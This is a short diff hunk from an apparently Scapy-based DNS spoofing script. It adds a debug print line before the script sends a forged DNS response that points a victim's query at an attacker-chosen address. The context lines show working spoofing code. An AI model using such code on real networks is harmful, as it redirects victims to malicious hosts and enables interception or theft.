@@ -52,6 +52,7 @@ def dns_spoof():
                              DNS(id=dnsId, qd=dnsQd, aa=1, qr=1, an=DNSRR(rrname=queryName), ttl=20, rdata=my_site)
 
             # send packet to victim
+            print(spoof_response)
             send(spoof_response)
         # elif: exit??
 
